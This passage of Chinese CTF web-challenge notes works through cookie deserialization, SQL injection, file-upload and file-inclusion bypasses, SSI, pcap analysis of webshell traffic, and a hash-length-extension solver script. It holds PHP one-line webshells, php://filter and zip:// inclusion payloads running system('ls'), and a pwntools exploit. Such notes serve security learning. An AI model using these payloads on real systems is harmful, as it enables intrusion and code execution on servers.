"</span>$KEY<span class="string">") </span></span><br><span class="line"><span class="string">echo "</span>$flag<span class="string">";</span></span><br><span class="line"><span class="string">else &#123;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta http-equiv="</span>Content-Type<span class="string">" content="</span>text/html; charset=UTF<span class="number">-8</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;link rel="</span>stylesheet<span class="string">" href="</span>admin.css<span class="string">" type="</span>text/css<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;div class="</span>container<span class="string">" align="</span>center<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;form method="</span>POST<span class="string">" action="</span><span class="comment">#"&gt;</span></span><br><span class="line">&lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">打算直接提交ISecer = $KEY 的反序列化，后面发现在此之前$KEY都没有被定义，所以KEY是空的，</span><br><span class="line">只需提交空的序列化上去就可以了</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = serialize(<span class="string">"$key"</span>);</span><br><span class="line">print_r($cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">这样构造一下，就得到了 s:<span class="number">0</span>:<span class="string">""</span>;</span><br><span class="line">但是注意;(分号)在cookie中不会被正确的上传到服务器，构造URL编码</span><br><span class="line">;的URL编码为%<span class="number">3</span>B</span><br><span class="line">所以 cookie:ISecer=s:<span class="number">0</span>:<span class="string">""</span>%<span class="number">3</span>B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># INSERT INTO注入</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多次</span></span><br><span class="line">又是一个注入题，常规的 <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 啥的都被过滤掉了，多积累姿势</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">之前还以为要传马，后面查wp发现是我想多了，只要成功传php文件就能拿到flag</span><br><span class="line">顺便学习下文件上传</span><br><span class="line">Content-Type: Multipart/form-data + .php5 ???</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件包含2</span></span><br><span class="line">直接伪协议试试：php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">=&gt; NAIVE! 查看源码发现 upload.php =&gt; 文件上传</span><br><span class="line"></span><br><span class="line">wp上写的是.php;.jpg，我的直接传个 .gif，然后利用本身的 file=xxx，查看了所传图片，命令就被执行了</span><br><span class="line"><span class="comment">// 命令执行</span></span><br><span class="line">&lt;script language=php&gt; system(<span class="string">"ls"</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">// 牛逼啊，直接能看到本目录下的所有文件</span></span><br><span class="line">about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php</span><br><span class="line">还有个思路，传马之后，菜刀连接，此处不用改后缀名也能解析？？</span><br><span class="line"><span class="comment">// 一句话木马</span></span><br><span class="line">&lt;script language=php&gt;<span class="keyword">eval</span>($_POST[<span class="string">'A'</span>])&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP_incrypt_1</span></span><br><span class="line">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span> </span>&#123;</span><br><span class="line">$key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$len = strlen($data);</span><br><span class="line">$klen = strlen($key);</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if ($x == $klen) &#123;</span></span><br><span class="line"><span class="comment">$x = 0;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">$char .= $key[$x % $klen];</span><br><span class="line">$x += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line"><span class="comment">// $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);</span></span><br><span class="line">$str .= chr((ord($data[$i]+ $key[$i % $klen]) % <span class="number">128</span>);</span><br><span class="line"><span class="comment">// chr 字符，ord ASCII码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">key = hashlib.md5(<span class="string">"ISCC"</span>.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">base_64 = <span class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span></span><br><span class="line">base_64 = base64.b64decode(base_64)</span><br><span class="line">data_len = len(base_64)</span><br><span class="line"></span><br><span class="line">str_ = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i in range(len(base_64)):</span><br><span class="line">str_ += chr((base_64[i]-ord(key[i%len(key)]))%<span class="number">128</span>)  <span class="comment"># 这个题有点水</span></span><br><span class="line"><span class="keyword">print</span>(str_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件上传2(湖湘杯)</span></span><br><span class="line">这个题有点坑，我把源码都弄下来后仔细的看能不能绕过，结果看下别人的wp，直接有一个flag.php，我之前没扫出来。</span><br><span class="line">这教会了我一个道理，先扫flag，flag.php已加入字典，以后就能扫出来了。</span><br><span class="line"></span><br><span class="line">下面的安全性已经非常高了，后缀被控死</span><br><span class="line">upload.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; <span class="keyword">isset</span>($_FILES[<span class="string">'image'</span>])) &#123;</span><br><span class="line">$fn = $_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>];     <span class="comment">// 存储在服务器的文件的临时副本的名称</span></span><br><span class="line">$ft = $_FILES[<span class="string">'image'</span>][<span class="string">'type'</span>];         <span class="comment">// 上传文件的类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_uploaded_file($fn)) &#123;  <span class="comment">// 判断指定的文件是否是通过 HTTP POST 上传的。</span></span><br><span class="line">fatal(<span class="string">'uploaded file corrupted'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'image/png'</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($ft,$array))&#123;</span><br><span class="line">fatal(<span class="string">"Sorry, only PNG files are allowed."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$imagekey = create_image_key();</span><br><span class="line"></span><br><span class="line">move_uploaded_file($fn, <span class="string">"uploads/$imagekey.png"</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Location: ?op=show&amp;imagekey=$imagekey"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'imagekey'</span>])) &#123;</span><br><span class="line">header(<span class="string">'Location: ?op=home'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$imagekey = $_GET[<span class="string">'imagekey'</span>];</span><br><span class="line">$im = load_image($imagekey);</span><br><span class="line"></span><br><span class="line">$w = imagesx($im);</span><br><span class="line">$h = imagesy($im);</span><br><span class="line"><span class="keyword">if</span>($w &gt; MAX_IM_SIZE || $h &gt; MAX_IM_SIZE)</span><br><span class="line">fatal(<span class="string">"Invalid image dimensions."</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class="article"&gt;</span><br><span class="line">&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;&lt;img src=<span class="string">"uploads/&lt;?=$imagekey;?&gt;.png"</span> /&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;a href=<span class="string">"uploads/&lt;?=$imagekey;?&gt;.png"</span>&gt;View saved image&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">common.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'FROM_INDEX'</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">define(<span class="string">'MAX_IM_SIZE'</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_image_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] . time() . mt_rand());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_image</span><span class="params">($imagekey)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> !== preg_match(<span class="string">'/[0-9a-f]&#123;40&#125;/'</span>, $imagekey)) &#123;</span><br><span class="line">fatal(<span class="string">'Invalid image key.'</span>);</span><br><span class="line"><span class="comment">// imagekey=9f6703af622b96dc1a4d01b889587f1ee3fc88d7</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$im = imagecreatefrompng(<span class="string">"uploads/&#123;$imagekey&#125;.png"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$im) &#123;</span><br><span class="line">fatal(<span class="string">'Failed to load image.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $im;</span><br><span class="line">&#125;</span><br><span class="line">stream_wrapper_unregister (<span class="string">"zip"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是一个神奇的登录框</span></span><br><span class="line">直接sqlmap的post注入搞定了</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssi</span></span><br><span class="line">EIS2018题感觉不错加上了</span><br><span class="line">http:<span class="comment">//httpd.apache.org/docs/current/howto/ssi.html</span></span><br><span class="line">https:<span class="comment">//www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/wutianxu123/article/details/82724637</span></span><br><span class="line">https:<span class="comment">//www.secpulse.com/archives/66934.html</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TinySSI</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">$parsed = $connect;</span><br><span class="line"><span class="comment">/** #include **/</span></span><br><span class="line">$parsed = preg_replace_callback(<span class="string">'|&lt;!--#include virtual="(.*?)"(\s)*--&gt;|'</span>,</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">($matches)</span> </span>&#123; </span><br><span class="line">$output = file_get_contents(<span class="string">"./"</span> . $matches[<span class="number">1</span>]); </span><br><span class="line"><span class="keyword">return</span> $output; </span><br><span class="line">&#125;, $parsed); </span><br><span class="line"><span class="keyword">return</span> $parsed; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Flag is in the file 'flag' in this path\n"</span>;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'ssi.php'</span>);</span><br><span class="line">$parser = <span class="keyword">new</span> TinySSI;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"Your name is "</span> . $parser-&gt;parse($_GET[<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#include virtual="flag" --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql注入2</span></span><br><span class="line">全都tm过滤了绝望吗？</span><br><span class="line">提示 !,!=,=,+,-,^,%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag 被盗</span></span><br><span class="line">跟踪了几个TCP流，发现shell.php，后来在TCP流中直接看到了flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中国菜刀</span></span><br><span class="line">看了几个数据流，发现了一下内容</span><br><span class="line">flag.tar.gz<span class="number">2016</span><span class="number">-06</span><span class="number">-27</span> <span class="number">08</span>:<span class="number">45</span>:<span class="number">38</span><span class="number">203</span><span class="number">0666</span></span><br><span class="line">log.txt<span class="number">2015</span><span class="number">-06</span><span class="number">-03</span> <span class="number">12</span>:<span class="number">18</span>:<span class="number">46</span><span class="number">1502</span><span class="number">0666</span></span><br><span class="line">news.asp<span class="number">2014</span><span class="number">-06</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">44</span>:<span class="number">24</span><span class="number">365</span><span class="number">0666</span></span><br><span class="line">SaveFile.asp<span class="number">2014</span><span class="number">-06</span><span class="number">-27</span> <span class="number">05</span>:<span class="number">45</span>:<span class="number">08</span><span class="number">822</span><span class="number">0666</span></span><br><span class="line">testNull.php<span class="number">2014</span><span class="number">-07</span><span class="number">-17</span> <span class="number">08</span>:<span class="number">06</span>:<span class="number">14</span><span class="number">16</span><span class="number">0666</span></span><br><span class="line">upload.html<span class="number">2014</span><span class="number">-06</span><span class="number">-27</span> <span class="number">05</span>:<span class="number">27</span>:<span class="number">46</span><span class="number">364</span><span class="number">0666</span></span><br><span class="line">webshell.php<span class="number">2014</span><span class="number">-07</span><span class="number">-21</span> <span class="number">05</span>:<span class="number">52</span>:<span class="number">36</span><span class="number">18</span><span class="number">0666</span></span><br><span class="line">xiaoma.asp;.jpg<span class="number">2014</span><span class="number">-07</span><span class="number">-04</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">18</span><span class="number">1312</span><span class="number">0666</span></span><br><span class="line"></span><br><span class="line">猜测 caidao.pcapng 包含了其他文件</span><br><span class="line">使用 binwalk 查看一下</span><br><span class="line"><span class="number">7747</span>          <span class="number">0x1E43</span>          gzip compressed data, from Unix, last modified: <span class="number">2016</span><span class="number">-06</span><span class="number">-27</span> <span class="number">08</span>:<span class="number">44</span>:<span class="number">39</span></span><br><span class="line"></span><br><span class="line">提取 dd <span class="keyword">if</span>=caidao.pcapng of=<span class="number">1.</span>gzip skip=<span class="number">7747</span> bs=<span class="number">1</span> </span><br><span class="line"></span><br><span class="line">解压 ➜  CTF tar -xvf <span class="number">1.</span>gzip </span><br><span class="line">gzip: stdin: decompression OK, trailing garbage ignored</span><br><span class="line">flag/</span><br><span class="line">flag/flag.txt</span><br><span class="line">tar: Child returned status <span class="number">2</span></span><br><span class="line">tar: Error is not recoverable: exiting now</span><br><span class="line"></span><br><span class="line">可直接导出？以后补充</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这么多数据包</span></span><br><span class="line">打开一看真的是很多数据包，看一下http，没有。</span><br><span class="line">题目提示，寻找 getshell 流。一般的 getshell 流的 TCP 的报文中很可能包含 command 这个字段，</span><br><span class="line">我们可以通过 【协议 contains <span class="string">"内容"</span>】 来查找 getshell 流</span><br><span class="line">tcp contains <span class="string">"command"</span></span><br><span class="line">看到几个tcp</span><br><span class="line">再追踪tcp流</span><br><span class="line">C:\&gt;type s4cr4t.txt</span><br><span class="line">type s4cr4t.txt</span><br><span class="line">Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==</span><br><span class="line">C:\&gt;shutdown -r -t <span class="number">100</span> -m <span class="string">"Stupid Manager!"</span></span><br><span class="line">shutdown -r -t <span class="number">100</span> -m <span class="string">"Stupid Manager!"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 百越杯 买手机</span></span><br><span class="line">重点学习 zio</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">from urlparse import parse_qsl</span><br><span class="line">from zio import *</span><br><span class="line">import re, string, itertools</span><br><span class="line">io = zio((<span class="string">'117.50.13.182'</span>, <span class="number">8888</span>))</span><br><span class="line">io.read_until(<span class="string">'Command: '</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line">io.writeline(<span class="string">'9'</span>)</span><br><span class="line">io.read_until(<span class="string">'Your order:\n'</span>)</span><br><span class="line">c = io.readline(<span class="string">'\n'</span>)</span><br><span class="line">d = parse_qsl(c)</span><br><span class="line">hash = d[<span class="number">3</span>][<span class="number">1</span>].strip()</span><br><span class="line">pr = <span class="string">'product=Flag&amp;price=99999&amp;timestamp=%s'</span>%(d[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> hash, pr</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>,<span class="number">32</span>):</span><br><span class="line">ret = hashpumpy.hashpump(hash, pr, <span class="string">'&amp;price=233'</span>, i)</span><br><span class="line">order = <span class="string">'%s&amp;sign=%s'</span> %(ret[<span class="number">1</span>], ret[<span class="number">0</span>])</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line">io.read_until(<span class="string">'\n'</span>)</span><br><span class="line">io.writeline(order)</span><br><span class="line">io.read_until(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">import hashpumpy</span><br><span class="line">p = remote(<span class="string">"117.50.13.182"</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'9'</span>)</span><br><span class="line">timestamp = p.recvuntil(<span class="string">"&amp;sign="</span>)[<span class="number">-22</span>:<span class="number">-6</span>]</span><br><span class="line"></span><br><span class="line">sign = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">sign = sign[:<span class="number">-1</span>]</span><br><span class="line">pr = <span class="string">"product=Flag&amp;price=99999&amp;timestamp="</span>+timestamp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>,<span class="number">32</span>):</span><br><span class="line">ret = hashpumpy.hashpump(sign,pr,<span class="string">"&amp;price=11"</span>,i) </span><br><span class="line">order = <span class="string">'%s&amp;sign=%s'</span>%(ret[<span class="number">1</span>],ret[<span class="number">0</span>])</span><br><span class="line">temp = p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Well"</span> in temp:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"------------------------------&gt;&gt;&gt;&gt;&gt;"</span>,temp</span><br><span class="line"><span class="keyword">exit</span>()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(order))</span><br><span class="line"><span class="comment">#flag&#123;Hash_leNgth_eXt3ns1on_attack_!S)_E@sy&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># SWPUCTF2018 web3</span></span><br><span class="line">乍一看</span><br><span class="line"></span><br><span class="line"><span class="comment"># XCTF adworld Guess</span></span><br><span class="line">    伪协议查看源码：</span><br><span class="line">http:<span class="comment">//111.198.29.45:32406/?page=php://filter/read=convert.base64-encode/resource=index</span></span><br><span class="line"></span><br><span class="line">upload.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;div class=\"msg success\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span> </span>&#123;</span><br><span class="line">$set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line"><span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line"><span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line"><span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line"><span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">$str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">$ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">$str .= $set[$ch];</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">'./uP1O4Ds/'</span> . $str . <span class="string">'_'</span></span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);  <span class="comment">// 生成随机数做种子</span></span><br><span class="line">mt_srand($seed);  <span class="comment">// 用seed给随机数发生器播种</span></span><br><span class="line">$ss = mt_rand();  <span class="comment">// 取随机数</span></span><br><span class="line">$hash = md5(session_id() . $ss);</span><br><span class="line">setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br><span class="line"><span class="comment">// SESSION e6bf37f50f6f9f290e834613beb73cac  4bfeacdfd8404d5c03e91441ffef3a18</span></span><br><span class="line"><span class="comment">// 得到一个随机数 352940737</span></span><br><span class="line"><span class="comment">// 得到可能的种子 3281694990 3281694991 981279433</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/xlKZUYfp47Dl1cHKvGz84VIY64sIItpF_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/uISoLxXH6C3FBakm7buwAMVQGR3zwRoG_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/HNugRX9Vq7I2o9Tq67KrDbERlYpMjZGp_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/HQQ6DPmMEyttuA9AB5bic3MzOfOTKSa4_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/H4zDu3QZU6pbeFFLl8ax8TKMDwusUQfu_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">zip:<span class="comment">//uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"></span><br><span class="line">/uP1O4Ds/NugRX9Vq7I2o9Tq67KrDbERlYpMjZGpI_test.png</span><br><span class="line"></span><br><span class="line">zip:<span class="comment">//uP1O4Ds/OjOqKNhiJZUIgqFKGTVLHvk99BZNejf6_1.png1&amp;a=phpinfo();</span></span><br><span class="line"></span><br><span class="line">zip:<span class="comment">//uP1O4Ds/fds3uXk1hjEypt342Br71GmEuSvDpGSo_1.png/1&amp;a=echo system('ls');</span></span><br><span class="line">zip:<span class="comment">//uP1O4Ds/st8LyW7GqjK8SniSUB7RCBERGsHrplZn_1.png/1&amp;a=echo system('ls');</span></span><br><span class="line">zip:<span class="comment">//uP1O4Ds/OjOqKNhiJZUIgqFKGTVLHvk99BZNejf6_1.png/1&amp;a=echo system('ls');</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$check2 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span 